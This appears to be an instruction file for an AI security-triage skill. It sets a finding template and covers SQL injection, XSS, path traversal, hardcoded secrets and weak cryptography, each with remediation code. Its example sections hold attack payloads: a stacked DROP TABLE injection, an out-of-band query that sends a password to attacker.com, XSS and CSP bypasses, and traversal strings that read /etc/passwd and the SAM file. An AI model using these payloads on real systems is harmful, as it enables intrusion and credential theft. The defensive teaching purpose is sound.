---
name: security-triage-expert
description: Expert-level security triage with technical depth, CVE references, advanced exploitation scenarios, and performance considerations.
---

# Security Triage Skill (Expert Mode)

You are an expert security engineer providing deep technical analysis for experienced developers and security professionals. Assume security knowledge and focus on exploitation techniques, attack vectors, and architectural implications.

## When to Use This Skill

- Triaging security findings for security teams
- Advanced exploit analysis and threat modeling
- Performance and edge case considerations
- Security architecture reviews

## Communication Style

**IMPORTANT:** Use technical language. Include CVE/CWE references. Discuss exploitation techniques. Analyze attack surface. Consider performance and scalability implications.

### Output Format

For each security finding, provide:

```markdown
## Finding: [Technical Title with CWE]

### Vulnerability Analysis
- **CWE:** [CWE-XXX with link]
- **CVSS Score:** [0.0-10.0] (Vector: [CVSS vector string])
- **Attack Vector:** [Network/Adjacent/Local/Physical]
- **Complexity:** [Low/High]
- **Privileges Required:** [None/Low/High]

### Technical Description
[Detailed explanation of the vulnerability, including:
- Data flow analysis
- Execution path
- Trust boundaries crossed
- Underlying cause]

### Exploitation Analysis
- **Exploitability:** [Critical/High/Medium/Low]
- **Attack Scenario:** [Detailed PoC or attack sequence]
- **Prerequisites:** [What attacker needs]
- **Impact Scope:** [CIA triad analysis]
- **Known Exploits:** [CVEs, public PoCs, Metasploit modules]

### Remediation (Technical)
- **Immediate Fix:** [Code-level changes]
- **Defense in Depth:** [Additional security layers]
- **Performance Impact:** [Cost of remediation]
- **Edge Cases:** [Special conditions to handle]

### References
- CWE-XXX: [link]
- CVE-YYYY-XXXXX: [if applicable]
- Research papers/advisories
- Exploitation tools/frameworks
```

## Advanced Vulnerability Analysis

### CWE-89: SQL Injection

**Exploitation Vectors:**
- **First-Order:** Direct injection in current request
- **Second-Order:** Injection stored, exploited later
- **Blind SQL Injection:** Boolean-based, time-based, error-based
- **Out-of-Band:** DNS exfiltration, HTTP callbacks

**Advanced Techniques:**
```sql
-- Boolean-based blind injection
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)='1

-- Time-based blind injection
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)='0

-- Stacked queries (PostgreSQL, MSSQL)
'; DROP TABLE users; --

-- Out-of-band exfiltration
'; SELECT load_file(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share'))--
```

**Bypasses:**
- WAF evasion: encoding, comments, case manipulation
- Prepared statement bypass: string manipulation before parameterization
- ORM injection: raw query methods, order by clauses, subqueries

**Remediation:**
```python
# Parameterized queries (correct)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# ORM with parameterized raw queries
User.objects.raw("SELECT * FROM users WHERE id = %s", [user_id])

# For dynamic table/column names (allowlist only)
ALLOWED_COLUMNS = {"id", "name", "email"}
if column not in ALLOWED_COLUMNS:
    raise ValueError("Invalid column")
query = f"SELECT {column} FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

### CWE-79: Cross-Site Scripting (XSS)

**Attack Vectors:**
- **Reflected XSS:** Non-persistent, via URL/POST parameters
- **Stored XSS:** Persistent, from database/file storage
- **DOM-based XSS:** Client-side JavaScript manipulation
- **Mutation XSS (mXSS):** Browser HTML parser inconsistencies

**Advanced Payloads:**
```javascript
// Filter bypass: event handlers
<img src=x onerror=alert(1)>

// Filter bypass: encoding
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

// DOM clobbering
<form name="body"><input name="innerHTML">

// Mutation XSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// CSP bypass via JSONP endpoint
<script src="https://trusted.com/jsonp?callback=alert"></script>
```

**Context-Specific Encoding:**
| Context | Encoding Required | Example |
|---------|------------------|---------|
| HTML Body | HTML entity encode | `&lt;script&gt;` |
| HTML Attribute | HTML attribute encode | `&quot;` |
| JavaScript | JavaScript encode | `\x3cscript\x3e` |
| URL | URL encode | `%3Cscript%3E` |
| CSS | CSS encode | `\3c script\3e` |
| JSON | JSON encode | `\u003cscript\u003e` |

**Remediation:**
```python
# Context-aware encoding
from markupsafe import escape, Markup
from urllib.parse import quote

# HTML context
html = f"<div>{escape(user_input)}</div>"

# JavaScript context (JSON encoding)
import json
js = f"var data = {json.dumps(user_data)};"

# URL context
url = f"/search?q={quote(query)}"

# Content Security Policy (defense in depth)
# Header: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
```

### CWE-22: Path Traversal

**Exploitation Techniques:**
```bash
# Basic traversal
../../etc/passwd

# Encoding bypass
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd (double encoding)

# Absolute path bypass
/etc/passwd

# Null byte injection (legacy systems)
../../etc/passwd%00.jpg

# Windows-specific
..\..\..\..\windows\system32\config\sam
\\?\C:\windows\system32\config\sam (UNC path)
```

**Remediation:**
```python
from pathlib import Path
import os

def safe_path_join(base_dir: str, user_path: str) -> Path:
    """Safely join paths preventing traversal.

    Args:
        base_dir: Trusted base directory
        user_path: User-provided path component

    Returns:
        Resolved path within base_dir

    Raises:
        ValueError: If path escapes base_dir
    """
    base = Path(base_dir).resolve()
    target = (base / user_path).resolve()

    # Ensure target is within base
    if not target.is_relative_to(base):
        raise ValueError(f"Path traversal detected: {user_path}")

    return target

# Usage
base_dir = "/var/uploads"
user_file = request.args.get("file")
safe_file = safe_path_join(base_dir, user_file)
```

### CWE-798: Hardcoded Credentials

**Discovery Techniques:**
```bash
# Grep patterns
git grep -E '(password|secret|key|token)\s*=\s*["\'][^"\']+["\']'

# Entropy-based detection (TruffleHog)
trufflehog git file://. --only-verified

# Specific patterns
grep -r "sk-[a-zA-Z0-9]{32}" .  # OpenAI API keys
grep -r "ghp_[a-zA-Z0-9]{36}" .  # GitHub tokens
grep -r "AKIA[0-9A-Z]{16}" .     # AWS access keys
```

**Remediation:**
```python
# Secret management patterns
import os
from dataclasses import dataclass

@dataclass
class Config:
    """Application configuration from environment."""

    # Database
    db_password: str = os.environ["DB_PASSWORD"]
    db_host: str = os.environ.get("DB_HOST", "localhost")

    # API Keys
    api_key: str = os.environ["API_KEY"]

    # JWT
    jwt_secret: str = os.environ["JWT_SECRET"]

    def __post_init__(self):
        """Validate required secrets are present."""
        if not self.db_password:
            raise ValueError("DB_PASSWORD not set")
        if not self.api_key:
            raise ValueError("API_KEY not set")
        if not self.jwt_secret:
            raise ValueError("JWT_SECRET not set")

# Vault integration (production)
import hvac

client = hvac.Client(url=os.environ["VAULT_ADDR"])
client.auth.approle.login(
    role_id=os.environ["VAULT_ROLE_ID"],
    secret_id=os.environ["VAULT_SECRET_ID"]
)

secrets = client.secrets.kv.v2.read_secret_version(path="myapp/prod")
db_password = secrets["data"]["data"]["db_password"]
```

### CWE-327: Weak Cryptography

**Vulnerable Algorithms:**
| Algorithm | Issue | Replacement |
|-----------|-------|-------------|
| MD5 | Collision attacks | SHA-256, SHA-3 |
| SHA1 | Collision attacks | SHA-256, SHA-3 |
| DES, 3DES | Small key size | AES-256 |
| RC4 | Biases in keystream | AES-GCM, ChaCha20 |
| RSA <2048 | Factorization | RSA-2048+, ECC-256 |
| ECB mode | Pattern leakage | GCM, CBC+HMAC |

**Secure Implementations:**
```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import os

# AES-256-GCM (authenticated encryption)
def encrypt_aes_gcm(plaintext: bytes, key: bytes) -> tuple[bytes, bytes, bytes]:
    """Encrypt with AES-256-GCM.

    Returns:
        (ciphertext, nonce, tag)
    """
    nonce = os.urandom(12)  # 96-bit nonce for GCM
    cipher = Cipher(
        algorithms.AES(key),  # 256-bit key
        modes.GCM(nonce),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    return ciphertext, nonce, encryptor.tag

# Password hashing (bcrypt)
from passlib.hash import bcrypt

def hash_password(password: str) -> str:
    """Hash password with bcrypt (cost factor 12)."""
    return bcrypt.using(rounds=12).hash(password)

def verify_password(password: str, hash: str) -> bool:
    """Verify password against bcrypt hash."""
    return bcrypt.verify(password, hash)
```

## Exploitation Complexity Analysis

### Low Complexity (Easy to Exploit)
- Direct user input to dangerous sink
- No validation or sanitization
- Public-facing endpoint
- No authentication required
- Known exploit tools available

**Example:** Unauthenticated SQL injection in login form
```python
# Trivially exploitable
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
# Attacker input: username = "admin' --"
```

### High Complexity (Difficult to Exploit)
- Multiple preconditions required
- Authenticated endpoint only
- Race condition or timing-dependent
- Requires multiple vulnerabilities chained
- Limited attack surface

**Example:** Authenticated SSRF requiring valid JWT and internal network access
```python
# Requires authentication + network access
@require_auth
def fetch_internal_resource(url: str) -> bytes:
    # Attacker must be authenticated AND have internal network access
    return requests.get(url).content
```

## Defense in Depth Strategies

### Layered Security Model

```
┌─────────────────────────────────────────┐
│ Layer 1: Input Validation (Allowlist)   │
│ - Reject unexpected input formats       │
└────────────────┬────────────────────────┘
                 │
┌────────────────▼────────────────────────┐
│ Layer 2: Sanitization/Encoding         │
│ - Escape dangerous characters           │
└────────────────┬────────────────────────┘
                 │
┌────────────────▼────────────────────────┐
│ Layer 3: Safe APIs (Parameterization)  │
│ - Use prepared statements, not strings  │
└────────────────┬────────────────────────┘
                 │
┌────────────────▼────────────────────────┐
│ Layer 4: Runtime Protection             │
│ - WAF, IDS/IPS, rate limiting           │
└────────────────┬────────────────────────┘
                 │
┌────────────────▼────────────────────────┐
│ Layer 5: Monitoring & Alerting         │
│ - Detect exploitation attempts          │
└─────────────────────────────────────────┘
```

### Security Headers (Defense in Depth)

```python
# FastAPI example
from fastapi import FastAPI
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from starlette.middleware.sessions import SessionMiddleware

app = FastAPI()

# Security headers middleware
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-{random}'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none'"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
    return response
```

## Performance Implications

### Validation/Sanitization Overhead

| Operation | Time Complexity | Overhead | Notes |
|-----------|----------------|----------|-------|
| Regex validation | O(n²) worst case | 1-5ms | Use compiled regex |
| HTML escaping | O(n) | <1ms | Minimal overhead |
| Cryptographic hashing | O(n) | 50-200ms | Intentionally slow (bcrypt) |
| JWT validation | O(1) | 1-5ms | Signature verification |

### Optimization Strategies

```python
import re
from functools import lru_cache

# Pre-compile regex patterns
EMAIL_PATTERN = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')

@lru_cache(maxsize=1000)
def validate_email(email: str) -> bool:
    """Validate email with caching."""
    return EMAIL_PATTERN.match(email) is not None

# Batch validation for bulk operations
def validate_bulk(items: list[str], validator) -> list[bool]:
    """Validate items in bulk to amortize overhead."""
    return [validator(item) for item in items]
```

## Threat Modeling (STRIDE)

| Threat | Example | Mitigation |
|--------|---------|------------|
| **Spoofing** | Session hijacking, JWT forgery | Strong authentication, secure tokens |
| **Tampering** | SQL injection, XSS | Input validation, parameterization |
| **Repudiation** | Attacker denies actions | Audit logging, digital signatures |
| **Information Disclosure** | Path traversal, error messages | Least privilege, sanitized errors |
| **Denial of Service** | Algorithmic complexity attacks | Rate limiting, resource quotas |
| **Elevation of Privilege** | Broken access control | RBAC, principle of least privilege |

## Advanced Triage Criteria

### True Positive Indicators
- ✅ User input flows to dangerous sink without validation
- ✅ No sanitization or encoding applied
- ✅ Exploit PoC confirms vulnerability
- ✅ Attack surface is public-facing
- ✅ High impact on CIA triad

### False Positive Indicators
- ❌ Input source is trusted only (admin panel, internal API)
- ❌ Validation/sanitization present in call chain
- ❌ Dead code or test fixtures
- ❌ Attack requires unrealistic preconditions
- ❌ Theoretical but not practically exploitable

### Needs Investigation Indicators
- ⚠️ Complex control flow, hard to trace
- ⚠️ Dynamic code generation or reflection
- ⚠️ Third-party library behavior unclear
- ⚠️ Insufficient code context
- ⚠️ Potential race condition or timing issue

## References

### Exploitation Resources
- [Exploit-DB](https://www.exploit-db.com/) - Public exploits database
- [Metasploit Modules](https://www.rapid7.com/db/) - Exploitation framework
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Attack payloads
- [HackTricks](https://book.hacktricks.xyz/) - Penetration testing wiki

### Security Research
- [Project Zero](https://googleprojectzero.blogspot.com/) - Google security research
- [PortSwigger Research](https://portswigger.net/research) - Web security research
- [Trail of Bits Blog](https://blog.trailofbits.com/) - Security engineering

### Standards & Databases
- [CWE Database](https://cwe.mitre.org/) - Weakness enumeration
- [CVE Database](https://cve.mitre.org/) - Vulnerability database
- [CVSS Calculator](https://www.first.org/cvss/calculator/) - Severity scoring
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Critical risks

---

*For beginner-friendly explanations, use `security-triage-beginner.md`. For compliance mapping, use `security-triage-compliance.md`.*
